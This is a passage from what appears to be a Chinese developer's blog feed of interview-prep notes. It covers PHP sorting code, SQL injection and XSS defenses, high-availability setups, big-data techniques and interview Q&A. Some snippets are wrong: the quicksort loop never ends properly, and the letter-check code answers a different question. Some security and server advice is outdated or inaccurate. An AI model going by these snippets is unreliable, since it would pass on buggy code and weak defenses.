class="keyword">for</span> (<span class="variable">$i</span>=1; <span class="variable">$i</span>;<span class="variable">$i</span>++)&#123;    </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$array</span>[<span class="variable">$i</span>] &lt;= <span class="variable">$key</span>)&#123;</span><br><span class="line">            <span class="variable">$left_arr</span>[] = <span class="variable">$array</span>[<span class="variable">$i</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="variable">$right_arr</span>[] = <span class="variable">$array</span>[<span class="variable">$i</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$left_arr</span> = quick_sort(<span class="variable">$left_arr</span>);</span><br><span class="line">    <span class="variable">$right_arr</span> = quick_sort(<span class="variable">$right_arr</span>);</span><br><span class="line">    <span class="built_in">return</span> array_merge(<span class="variable">$left_arr</span>, array(<span class="variable">$key</span>), <span class="variable">$right_arr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li>写一个二维数组排序算法函数，能够具有通用性，可以调用php内置函数</li></ol><p>二维数组排序， $arr是数据，$keys是排序的健值，$order是排序规则，1是升序，0是降序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> array_sort(<span class="variable">$arr</span>, <span class="variable">$keys</span>, <span class="variable">$order</span>=0) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_array(<span class="variable">$arr</span>)) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$keysvalue</span> = array();</span><br><span class="line">    foreach(<span class="variable">$arr</span> as <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="variable">$keysvalue</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>[<span class="variable">$keys</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$order</span> == 0)&#123;</span><br><span class="line">        asort(<span class="variable">$keysvalue</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        arsort(<span class="variable">$keysvalue</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    reset(<span class="variable">$keysvalue</span>);</span><br><span class="line">    foreach(<span class="variable">$keysvalue</span> as <span class="variable">$key</span> =&gt; <span class="variable">$vals</span>) &#123;</span><br><span class="line">        <span class="variable">$keysort</span>[<span class="variable">$key</span>] = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$new_array</span> = array();</span><br><span class="line">    foreach(<span class="variable">$keysort</span> as <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="variable">$new_array</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>[<span class="variable">$val</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$new_array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> job </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>web安全</title>
      <link href="/web%E5%AE%89%E5%85%A8.html"/>
      <url>/web%E5%AE%89%E5%85%A8.html</url>
      <content type="html"><![CDATA[<h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><ul><li>stripslashes()函数过滤用户输入，然后再用mysql_real_escape_string()对用户输入进行sql语句过滤</li><li>参数类型绑定或强制转换intval()，关键字预处理</li></ul><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><ul><li>反射型XSS</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反射型XSS也被称为非持久性XSS,这种攻击方式把XSS的Payload写在URL中，通过浏览器直接“反射”给用户。</span><br><span class="line">这种攻击方式通常需要诱使用户点击某个恶意链接，才能攻击成功。</span><br></pre></td></tr></table></figure><ul><li>存储型XSS</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">存储型XSS又被称为持久性XSS,会把黑客输入的恶意脚本存储在服务器的数据库中。</span><br><span class="line">当其他用户浏览页面包含这个恶意脚本的页面，用户将会受到黑客的攻击。</span><br><span class="line">一个常见的场景就是黑客写下一篇包含恶意JavaScript脚本的博客文章，当其他用户浏览这篇文章时，恶意的JavaScript代码将会执行。</span><br></pre></td></tr></table></figure><ul><li>DOM Based XSS </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DOM Based XSS是一种利用前端代码漏洞进行攻击的攻击方式。</span><br><span class="line">前面的反射型XSS与存储型XSS虽然恶意脚本的存放位置不同，但其本质都是利用后端代码的漏洞。</span><br></pre></td></tr></table></figure><p>反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，DOM Based中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行</p><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ul><li>HttpOnly</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用HTTP only的cookie</span><br></pre></td></tr></table></figure><ul><li>strip_tags、htmlspecialchars</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在使用htmlspecialchars()函数的时候注意第二个参数, 直接用htmlspecialchars(<span class="variable">$string</span>) 的话,</span><br><span class="line">第二个参数默认是ENT_COMPAT,函数默认只是转化双引号(“), 不对单引号(‘)做转义.</span><br><span class="line">所以,htmlspecialchars函数更多的时候要加上第二个参数, 应该这样用: htmlspecialchars(<span class="variable">$string</span>,ENT_QUOTES).</span><br><span class="line">当然,如果需要不转化如何的引号,用htmlspecialchars(<span class="variable">$string</span>,ENT_NOQUOTES).</span><br><span class="line">富文本内容里可以过滤掉&lt;script&gt;标签，因为富文本只是文章，不可能会嵌入script脚本</span><br><span class="line">处理DOM元素属性中的script脚本</span><br></pre></td></tr></table></figure><ul><li>HTML Purifier</li></ul>]]></content>
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> XSS </tag>
            
            <tag> CRSF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>高可用架构</title>
      <link href="/linux%E9%AB%98%E5%8F%AF%E7%94%A8.html"/>
      <url>/linux%E9%AB%98%E5%8F%AF%E7%94%A8.html</url>
      <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​    Heartbeat、Corosync、Keepalived这三个集群组件我们到底选哪个好，首先我想说明的是，Heartbeat、Corosync是属于同一类型，Keepalived与Heartbeat、Corosync，根本不是同一类型的。Keepalived使用的vrrp协议方式，虚拟路由冗余协议 (Virtual Router Redundancy Protocol，简称VRRP)；Heartbeat或Corosync是基于主机或网络服务的高可用方式；简单的说就是，Keepalived的目的是模拟路由器的高可用，Heartbeat或Corosync的目的是实现Service的高可用。</p><p>​    所以一般Keepalived是实现前端高可用，常用的前端高可用的组合有，就是我们常见的LVS+Keepalived、Nginx+Keepalived、HAproxy+Keepalived。而Heartbeat或Corosync是实现服务的高可用，常见的组合有Heartbeat v3(Corosync)+Pacemaker+NFS+Httpd 实现Web服务器的高可用、Heartbeat v3(Corosync)+Pacemaker+NFS+MySQL 实现MySQL服务器的高可用。总结一下，Keepalived中实现轻量级的高可用，一般用于前端高可用，且不需要共享存储，一般常用于两个节点的高可用。而Heartbeat(或Corosync)一般用于服务的高可用，且需要共享存储，一般用于多节点的高可用。这个问题我们说明白了。</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>高可用HA（High Availability）是分布式系统架构设计中必须考虑的因素之一， 它通常是指，通过设计减少系统不能提供服务的时间。</p><p>单点往往是系统高可用最大的风险和敌人，应该尽量在系统设计的过程中避免单点。 高可用保证的原则是“集群化”，或者叫“冗余”：只有一个单点，挂了服务会受影响。<br>如果有冗余备份，挂了还有其他backup能够顶上。</p><p>有了冗余之后，还不够，每次出现故障需要人工介入恢复势必会增加系统的不可服务实践。<br> 所以，又往往是通过“自动故障转移”来实现系统的高可用。</p><ul><li>客户端层：典型调用方是浏览器browser或者手机应用APP    </li><li>反向代理层：系统入口，反向代理</li><li>站点应用层：实现核心应用逻辑，返回html或者json</li><li>服务层：如果实现了服务化，就有这一层</li><li>数据-缓存层：缓存加速访问存储</li><li>数据-数据库层：数据库固化数据存储</li></ul><h3 id="客户端到方向代理"><a href="#客户端到方向代理" class="headerlink" title="客户端到方向代理"></a>客户端到方向代理</h3><p>【客户端层】到【反向代理层】的高可用，是通过反向代理层的冗余来实现的。以nginx为例：有两台nginx， 一台对线上提供服务，另一台冗余以保证高可用，常见的实践是keepalived存活探测，相同virtual IP提供服务。</p><p>自动故障转移：当nginx挂了的时候，keepalived能够探测到心跳，会自动的进行故障转移， 将流量自动迁移到备份nginx，由于使用的是相同的virtual IP，这个切换过程对调用方是透明的</p><h3 id="反向代理层到站点层"><a href="#反向代理层到站点层" class="headerlink" title="反向代理层到站点层"></a>反向代理层到站点层</h3><p>【反向代理层】到【站点层】的高可用，是通过站点层的冗余来实现的。 假设反向代理层是nginx，nginx.conf里能够配置多个web后端，并且nginx能够探测到多个后端的存活性。</p><p>自动故障转移：当web-server挂了的时候，nginx能够探测到，会自动的进行故障转移， 将流量自动迁移到其他的web-server，整个过程由nginx自动完成，对调用方是透明的。</p><h3 id="站点层到服务层"><a href="#站点层到服务层" class="headerlink" title="站点层到服务层"></a>站点层到服务层</h3><p>【站点层】到【服务层】的高可用，是通过服务层的冗余来实现的。“服务连接池”会建立与下游服务多个连接，每次请求会“随机”选取连接来访问下游服务。</p><p>自动故障转移：当service挂了的时候，service-connection-pool能够探测到，会自动的进行故障转移，将流量自动迁移到其他的service， 整个过程由连接池自动完成，对调用方是透明的（所以说RPC-client中的服务连接池是很重要的基础组件）。</p><p>一般这个会使用到分布式服务框架</p><h3 id="数据库层的高可用"><a href="#数据库层的高可用" class="headerlink" title="数据库层的高可用"></a>数据库层的高可用</h3><p>大部分互联网技术，数据库层都用了“主从同步，读写分离”架构，所以数据库层的高可用，又分为“读库高可用”与“写库高可用”两类。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>【客户端层】到【反向代理层】的高可用，是通过反向代理层的冗余实现的，常见实践是keepalived + virtual IP自动故障转移</li><li>【反向代理层】到【站点层】的高可用，是通过站点层的冗余实现的，常见实践是nginx与web-server之间的存活性探测与自动故障转移</li><li>【站点层】到【服务层】的高可用，是通过服务层的冗余实现的，常见实践是通过service-connection-pool来保证自动故障转移</li><li>【服务层】到【缓存层】的高可用，是通过缓存数据的冗余实现的，常见实践是缓存客户端双读双写，或者利用缓存集群的主从数据同步与sentinel保活与自动故障转移；更多的业务场景，对缓存没有高可用要求，可以使用缓存服务化来对调用方屏蔽底层复杂性</li><li>【服务层】到【数据库“读”】的高可用，是通过读库的冗余实现的，常见实践是通过db-connection-pool来保证自动故障转移</li><li>【服务层】到【数据库“写”】的高可用，是通过写库的冗余实现的，常见实践是keepalived + virtual IP自动故障转移</li></ul><h3 id="MySQL读写分离"><a href="#MySQL读写分离" class="headerlink" title="MySQL读写分离"></a>MySQL读写分离</h3><p>MySQLProxy实际上是在客户端请求与MySQLServer之间建立了一个连接池。所有客户端请求都是发向MySQLProxy，然后经由MySQLProxy进行相应的分析，判断出是读操作还是写操作，分发至对应的MySQLServer上。对于多节点Slave集群，也可以起做到负载均衡的效果。</p><p>HAProxy在使用方式上和MySQL-Proxy略有区别，它要求在应用层做读写分离，并需要给HAProxy分别配置读/写端口，一个用来做写操作，一个用来做读操作。然后在应用层还需要做一点修改，这又回到了最开始的的应用层做读写分离的情况，唯一的区别是这里把情况由原来的一写多读变成了一写一读。</p><ul><li>程序修改mysql操作类</li></ul><p>可以参考PHP实现的Mysql读写分离，阿权开始的本项目，以php程序解决此需求。<br>优点：直接和数据库通信，简单快捷的读写分离和随机的方式实现的负载均衡，权限独立分配<br>缺点：自己维护更新，增减服务器在代码处理</p><ul><li>amoeba</li></ul><p>参考官网：<a href="http://amoeba.meidusa.com/" target="_blank" rel="noopener">http://amoeba.meidusa.com/</a><br>优点：直接实现读写分离和负载均衡，不用修改代码，有很灵活的数据解决方案<br>缺点：自己分配账户，和后端数据库权限管理独立，权限处理不够灵活</p><ul><li>mysql-proxy</li></ul><p>参考 mysql-proxy。<br>优点：直接实现读写分离和负载均衡，不用修改代码，master和slave用一样的帐号<br>缺点：字符集问题，lua语言编程，还只是alpha版本，时间消耗有点高</p><ul><li>MySQL 采用HAproxy或amoeba进行高可用</li></ul><p>通过前面的keepalived故障模拟可以看出，当keepalived挂掉之后，或者当主机宕机时，VIP是可以切换到备机工作。<br>但是如果keepalived没有挂，并且主机也没有宕机，而是haproxy自身挂掉了呢？<br>这个时候不会有任何切换动作，下面我们要做的就是为keepalived提供一个脚本用来检测haproxy是否正常工作，<br>如果没有正常工作可以再次启动haproxy，或者关闭keepalived自身。<br>这样一来，keepalived自身挂掉了，那么VIP就可以切换到备机上工作了。</p>]]></content>
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> job </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>大数据处理问题</title>
      <link href="/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98.html"/>
      <url>/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98.html</url>
      <content type="html"><![CDATA[<h3 id="分而治之-Hash映射-Hash-map统计-堆-快速-归并排序"><a href="#分而治之-Hash映射-Hash-map统计-堆-快速-归并排序" class="headerlink" title="分而治之/Hash映射 + Hash_map统计 + 堆/快速/归并排序"></a>分而治之/Hash映射 + Hash_map统计 + 堆/快速/归并排序</h3><ul><li>分而治之/hash映射：针对数据太大，内存受限，只能是：把大文件化成(取模映射)小文件，即16字方针：大而化小，各个击破，缩小规模，逐个解决</li><li>hash_map统计：当大文件转化了小文件，那么我们便可以采用常规的hash_map(ip，value)来进行频率统计。</li><li>堆/快速排序：统计完了之后，便进行排序(可采取堆排序)，得到次数最多的IP。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先是这一天，并且是访问百度的日志中的IP取出来，逐个写入到一个大文件中。</span><br><span class="line">注意到IP是32位的，最多有个2^32个IP。同样可以采用映射的方法，比如%1000，</span><br><span class="line">把整个大文件映射为1000个小文件，</span><br><span class="line">再找出每个小文中出现频率最大的IP（可以采用hash_map对那1000个文件中的所有IP进行频率统计，</span><br><span class="line">然后依次找出各个文件中频率最大的那个IP）及相应的频率。</span><br><span class="line">然后再在这1000个最大的IP中，找出那个频率最大的IP，即为所求</span><br></pre></td></tr></table></figure><h3 id="多层划分"><a href="#多层划分" class="headerlink" title="多层划分"></a>多层划分</h3><ul><li>其实本质上还是分而治之的思想，重在“分”的技巧上！<br>适用范围：第k大，中位数，不重复或重复的数字<br>基本原理及要点：因为元素范围很大，不能利用直接寻址表，所以通过多次划分，逐步确定范围，然后最后在一个可以接受的范围内进行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">5亿个int找它们的中位数</span><br><span class="line">方法同基数排序有些像，开一个大小为65536的Int数组，第一遍读取，</span><br><span class="line">统计Int32的高16位的情况，也就是0-65535，都算作0,65536 - 131071都算作1。</span><br><span class="line">就相当于用该数除以65536。</span><br><span class="line">Int32 除以 65536的结果不会超过65536种情况，因此开一个长度为65536的数组计数就可以。</span><br><span class="line">每读取一个数，数组中对应的计数+1，考虑有负数的情况，需要将结果加32768后，记录在相应的数组内。</span><br><span class="line">第一遍统计之后，遍历数组，逐个累加统计，看中位数处于哪个区间，比如处于区间k，</span><br><span class="line">那么0- k-1的区间里数字的数量sum应该&lt;n/2（2.5亿）。</span><br><span class="line">而k+1 - 65535的计数和也&lt;n/2，第二遍统计同上面的方法类似，</span><br><span class="line">但这次只统计处于区间k的情况，也就是说(x / 65536) + 32768 = k。</span><br><span class="line">统计只统计低16位的情况。并且利用刚才统计的sum，比如sum = 2.49亿，</span><br><span class="line">那么现在就是要在低16位里面找100万个数(2.5亿-2.49亿)。</span><br><span class="line">这次计数之后，再统计一下，看中位数所处的区间，最后将高位和低位组合一下就是结果了。</span><br></pre></td></tr></table></figure><h3 id="Bloom-filter-Bitmap"><a href="#Bloom-filter-Bitmap" class="headerlink" title="Bloom filter/Bitmap"></a>Bloom filter/Bitmap</h3><ul><li>适用范围：可以用来实现数据字典，进行数据的判重，或者集合求交集<br>　　基本原理及要点：<br>　　对于原理来说很简单，位数组+k个独立hash函数。将hash函数对应的值的位数组置1，查找时如果发现所有hash函数对应位都是1说明存在，很明显这个过程并不保证查找的结果是100%正确的。同时也不支持删除一个已经插入的关键字，因为该关键字对应的位会牵动到其他的关键字。所以一个简单的改进就是 counting Bloom filter，用一个counter数组代替位数组，就可以支持删除了。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在2.5亿个整数中找出不重复的整数，注，内存不足以容纳这2.5亿个整数</span><br><span class="line"></span><br><span class="line">采用2-Bitmap（每个数分配2bit，00表示不存在，01表示出现一次，10表示多次，11无意义）进行，共需内存2^32 * 2 bit=1 GB内存，还可以接受。然后扫描这2.5亿个整数，查看Bitmap中相对应位，如果是00变01，01变10，10保持不变。所描完事后，查看bitmap，把对应位是01的整数输出即可。</span><br></pre></td></tr></table></figure></li></ul><h3 id="Trie树-数据库-倒排索引"><a href="#Trie树-数据库-倒排索引" class="headerlink" title="Trie树/数据库/倒排索引"></a>Trie树/数据库/倒排索引</h3><ul><li>适用范围：数据量大，重复多，但是数据种类小可以放入内存<br>　　基本原理及要点：实现方式，节点孩子的表示方式<br>　　扩展：压缩实现。</li></ul><h3 id="外排序"><a href="#外排序" class="headerlink" title="外排序"></a>外排序</h3><ul><li>适用范围：大数据的排序，去重<br>　　基本原理及要点：外排序的归并方法，置换选择败者树原理，最优归并树<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">有一个1G大小的一个文件，里面每一行是一个词，词的大小不超过16个字节，内存限制大小是1M。</span><br><span class="line">返回频数最高的100个词。</span><br><span class="line">这个数据具有很明显的特点，词的大小为16个字节，但是内存只有1M做<span class="built_in">hash</span>明显不够，所以可以用来排序。</span><br><span class="line">内存可以当输入缓冲区使用。</span><br></pre></td></tr></table></figure></li></ul><h3 id="分布式处理之Mapreduce"><a href="#分布式处理之Mapreduce" class="headerlink" title="分布式处理之Mapreduce"></a>分布式处理之Mapreduce</h3><ul><li>MapReduce是一种计算模型，简单的说就是将大批量的工作（数据）分解（MAP）执行，然后再将结果合并成最终结果（REDUCE）。<br>这样做的好处是可以在任务被分解后，可以通过大量机器进行并行计算，减少整个操作的时间。但如果你要我再通俗点介绍，那么，说白了，Mapreduce的原理就是一个归并排序</li><li>适用范围：数据量大，但是数据种类小可以放入内存<br>  基本原理及要点：将数据交给不同的机器去处理，数据划分，结果归约。</li></ul>]]></content>
      
      <categories>
          
          <category> 数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> job </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>面试</title>
      <link href="/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98.html"/>
      <url>/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98.html</url>
      <content type="html"><![CDATA[<ul><li><p>问项目的具体内容，遇到的挑战，具体解决办法。<br>为什么使用独立文件服务器？<br>  1，从服务器本身来说，单台的话会加大机器IO负载，多台( 负载均衡 )的话涉及到文件同步的问题<br>  2，浏览器对一个域名下的并发是有数量限制的，独立域名的文件服务器会加快响应<br>  3，防止域名污染，请求图片的时候是不用带上cookie</p></li><li><p>memcache与redis的区别，redis的优势之处。怎样解决memcache命中率低的问题，问了在实际项目中memcache命中率。<br>  redis丰富的数据结构，支持持久化，支持同步。提供命中率一般都是把数据细粒度化，分级组合缓存。<br>  memcache命中率查看：telnet连接上去 执行status命令 get_hits/cmd_get * 100%<br>  <a href="https://yq.aliyun.com/articles/48955" target="_blank" rel="noopener">https://yq.aliyun.com/articles/48955</a></p></li><li><p>svn与git 的区别，让说具体的工作流程，使用git 的好处，以及怎样处理冲突，基本的命令写了两个。<br>  最核心的区别Git是分布式的，而Svn不是分布的</p></li><li><p>数据库的存储引擎，myisam与innodb的区别，说出除了这两种外的其他存储引擎。<br>  区别：索引，事务，结构<br>  tokuDB,memory等</p></li><li><p>int 与bigint的区别，实际使用的时候主键选择哪个？int（10）与int（11）的区别，varchar与char的区别<br>  长度不一样，看情况数据多久使用bigint。 int(10) / int(11) 后面这个括号里的数字是显示长度，不会影响到存储，有zerofill的时候才有区别。varchar是变长 char是定长。</p></li><li><p>数据库设计，用户表与登录表分开的好处，<br>  冷热数据分开，提高速度因为活跃用户只是总用户的一小部分,</p></li><li><p>session与cookie的区别<br>  分布式怎样解决session共享问题存储在独立的共享空间中（mysql，redis，memcache）</p></li><li><p>get与post的区别<br>  GET的语义是请求获取指定的资源。GET方法是安全、幂等、可缓存的（除非有Cache-ControlHeader的约束）,GET方法的报文主体没有任何语义。POST的语义是根据请求负荷（报文主体）对指定的资源做出处理，具体的处理方式视资源类型而不同。POST不安全，不幂等，（大部分实现）不可缓存。为了针对其不可缓存性，有一系列的方法来进行优化，以后有机会再研究（FLAG已经立起）。</p></li><li>php autoload机制<br>  调用不存在的类的时候自动调用该函数，该函数内部实现通过类名（参数）查找类文件的方法</li><li>三次握手与四次挥手的过程（主要是画图），各个参数的含义<br>   SYN    SYN+ACK   ACK</li><li>http与https的区别，https怎样保准安全（结合ssl）<br>[<a href="http://www.jianshu.com/p/b894a7e1c779]" target="_blank" rel="noopener">http://www.jianshu.com/p/b894a7e1c779]</a><br>[<a href="http://wetest.qq.com/lab/view/110.html]" target="_blank" rel="noopener">http://wetest.qq.com/lab/view/110.html]</a><br>[<a href="http://www.barretlee.com/blog/2016/04/24/detail-about-ca-and-certs/]" target="_blank" rel="noopener">http://www.barretlee.com/blog/2016/04/24/detail-about-ca-and-certs/]</a></li></ul><ul><li><p>链表的结构体（线性和链式），插入一个元素的操作代码（纸上写）</p></li><li><p>排序部分，时间复杂度，写出一个排序算法。</p><p>  冒泡排序</p><p>  ​    思想：两两比较相邻记录的关键字，反序则交换，直到没有反序为止。</p><p>  ​    分析：最好的情况比较n-1次，时间复杂度O(n)；最坏的情况比较n(n-1)/2次，时间复杂度O(n2)</p><p>  选择排序</p><p>  ​    思想：每趟在n-i+1次比较里，选择关键字最小的记录与第i个记录交换。</p><p>  ​    分析：比较次数，最好最坏都是n(n-1)/2次；交换次数，最好0次，最坏n-1次，综合起来时间复杂度是O(n2)。性能比冒泡好一点。</p><p>  插入排序</p><p>  ​    思想：将一个记录插入到已经排好序的有序表中，表记录数加1。</p><p>  ​    分析：如果记录顺序是随机的，平均比较和移动的次数为n2/4，时间复杂度是O(n2)。性能比冒泡和选择要好一点。</p></li><li><p>二分查找的思想，时间复杂度</p><p>  总共有n个元素，渐渐跟下去就是n,n/2,n/4,….n/2^k ，其中k就是循环的次数由于你n/2^k取整后&gt;=1</p><p>  即令n/2^k=1可得k=log2n,（是以2为底，n的对数）所以时间复杂度可以表示O()=O(logn)</p></li><li><p>apache与ngiax的区别<br>nginx性能高，这得益于Nginx使用了最新的epoll（Linux2.6内核）和kqueue（freebsd）网络I/O模型，而Apache则使用的是传统的select模型。目前Linux下能够承受高并发访问的Squid、Memcached都采用的是epoll网络I/O模型。<br>apache基于进程，nginx基于线程</p></li><li><p>有一个ip日志文件每行一个ip，统计某一个ip出现的次数<br>  cat file |grep ip |wc -l</p></li><li><p>mysql的索引是那种数据结构，为什么使用这种数据结构。<br>  B+树<br>  B树的各种操作能使B树保持较低的高度，从而达到有效避免磁盘过于频繁的查找存取操作，从而有效提高查找效率<br>  <a href="http://blog.codinglabs.org/articles/theory-of-mysql-index.html" target="_blank" rel="noopener">http://blog.codinglabs.org/articles/theory-of-mysql-index.html</a></p></li><li><p>设计一个数据表，用来存储url信息，此表会经常发生插入删除操作，应用场景是查找某个url是否存在，请写出表结构，并加说明。<br>  id url md5<br>  md5列加索引，url长度普遍偏长，域名重复度高，前缀索引在这种场景下不太好，使用MD5 char 固定长度索引</p></li><li><p>比较单词a 和 b判断b单词的字母是否都在a中。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">'abc'</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">'defc'</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = str_split(<span class="variable">$a</span> . <span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (count(<span class="variable">$arr</span>) != count(array_unique(<span class="variable">$arr</span>))) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'repeat'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'no repeat'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>写一个timer类，用来统计应用程序的运行时间，并写出调用方法。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class timer &#123;</span><br><span class="line">    private $checkPoint = [];</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;checkPoint[] = time();</span><br><span class="line">    &#125;</span><br><span class="line">    public function check() &#123;</span><br><span class="line">        $this-&gt;checkPoint[] = time();</span><br><span class="line">    &#125;</span><br><span class="line">    public function show() &#123;</span><br><span class="line">        foreach ($this-&gt;checkPoint as &amp;$item) &#123;</span><br><span class="line">            echo $item . PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$time = new timer();</span><br><span class="line">sleep(2);</span><br><span class="line">$time-&gt;check();</span><br><span class="line">sleep(4);</span><br><span class="line">$time-&gt;check();</span><br><span class="line">sleep(3);</span><br><span class="line">$time-&gt;show();</span><br></pre></td></tr></table></figure><ul><li>新浪微博一年产生的数据量是多少，应该怎么存储这些数据。<br>  历史数据归档, 使用压缩比高的引擎比如tokudb</li><li>状态吗：204，304，404的含义，可以参考（<a href="http://tool.oschina.net/commons?type=5）" target="_blank" rel="noopener">http://tool.oschina.net/commons?type=5）</a></li><li>介绍你了解的开源项目</li><li>索引的最左原则，可以参考（<a href="http://blog.csdn.net/shangxiaoxue/article/details/7514187）" target="_blank" rel="noopener">http://blog.csdn.net/shangxiaoxue/article/details/7514187）</a><br>  针对联合索引的</li><li><p>浏览器输入url到页面呈现，经过的过程， 和用到的协议</p></li><li><p>mc 与 redis的区别，内存管理方面。<br>  <a href="http://www.voidcn.com/article/p-nletigkh-yx.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-nletigkh-yx.html</a><br>  都是提前申请一大块内存，mc是把这块内存切成大小不一的块（通过增长因子），会有内存浪费，但是存取快<br>  redis是把这块内存的大小存在内存开始处，通过指针操作<br>微博中reids的应用场景，redis的内存分配机制，为什么使用redis不适用MC，mc与redis的并发哪个较高<br> 